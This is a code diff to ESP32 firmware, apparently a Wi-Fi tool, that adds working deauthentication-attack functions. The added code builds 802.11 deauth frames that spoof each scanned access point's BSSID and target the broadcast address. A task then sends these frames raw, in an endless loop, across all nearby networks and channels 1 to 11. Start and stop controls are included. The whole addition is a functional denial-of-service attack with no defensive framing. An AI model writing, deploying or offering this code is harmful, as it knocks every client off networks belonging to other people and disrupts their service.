@@ -341,6 +341,112 @@ void wifi_manager_list_stations() {
     }
 }
 
+esp_err_t wifi_manager_broadcast_deauth(uint8_t bssid[6], int channel, uint8_t mac[6]) {
+    esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    if (err != ESP_OK) {
+        ESP_LOGE("WiFiManager", "Failed to set channel: %s", esp_err_to_name(err));
+    }
+
+    uint8_t deauth_frame_default[26] = {
+        0xc0, 0x00, 0x3a, 0x01,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0xf0, 0xff, 0x02, 0x00
+    };
+
+    
+    // Build AP source packet
+    deauth_frame_default[4] = mac[0];
+    deauth_frame_default[5] = mac[1];
+    deauth_frame_default[6] = mac[2];
+    deauth_frame_default[7] = mac[3];
+    deauth_frame_default[8] = mac[4];
+    deauth_frame_default[9] = mac[5];
+    
+    deauth_frame_default[10] = bssid[0];
+    deauth_frame_default[11] = bssid[1];
+    deauth_frame_default[12] = bssid[2];
+    deauth_frame_default[13] = bssid[3];
+    deauth_frame_default[14] = bssid[4];
+    deauth_frame_default[15] = bssid[5];
+
+    deauth_frame_default[16] = bssid[0];
+    deauth_frame_default[17] = bssid[1];
+    deauth_frame_default[18] = bssid[2];
+    deauth_frame_default[19] = bssid[3];
+    deauth_frame_default[20] = bssid[4];
+    deauth_frame_default[21] = bssid[5]; 
+
+    
+    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+    err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+    if (err != ESP_OK) {
+        ESP_LOGE(TAG, "Failed to send beacon frame: %s", esp_err_to_name(err));
+        return err;
+    }
+
+    return ESP_OK;
+}
+
+void wifi_deauth_task(void *param) {
+    const char *ssid = (const char *)param;
+    uint16_t ap_count = 0;
+    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(&ap_count));
+
+    if (ap_count == 0) {
+        ESP_LOGI(TAG, "No access points found");
+        return;
+    }
+
+    wifi_ap_record_t *ap_info = malloc(sizeof(wifi_ap_record_t) * ap_count);
+    if (ap_info == NULL) {
+        ESP_LOGE(TAG, "Failed to allocate memory for AP info");
+        return;
+    }
+
+
+    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&ap_count, ap_info));
+
+
+    while (1) {
+    for (int i = 0; i < ap_count; i++)
+        for (int y = 1; y < 12; y++)
+        {
+            uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+            wifi_manager_broadcast_deauth(ap_info[i].bssid, y, broadcast_mac);
+            vTaskDelay(10 / portTICK_PERIOD_MS);
+        }
+    }
+}
+
+
+void wifi_manager_start_deauth()
+{
+    if (!beacon_task_running) {
+        ESP_LOGI(TAG, "Starting deauth transmission...");
+        xTaskCreate(wifi_deauth_task, "deauth_task", 2048, NULL, 5, &deauth_task_handle);
+        beacon_task_running = true;
+    } else {
+        ESP_LOGW(TAG, "Deauth transmission already running.");
+    }
+}
+
+void wifi_manager_stop_deauth()
+{
+    if (beacon_task_running) {
+        ESP_LOGI(TAG, "Stopping deauth transmission...");
+        if (deauth_task_handle != NULL) {
+            vTaskDelete(deauth_task_handle);
+            deauth_task_handle = NULL;
+            beacon_task_running = false;
+        }
+    } else {
+        ESP_LOGW(TAG, "No deauth transmission is running.");
+    }
+}
+
 // Print the scan results and match BSSID to known companies
 void wifi_manager_print_scan_results_with_oui() {
     uint16_t ap_count = 0;
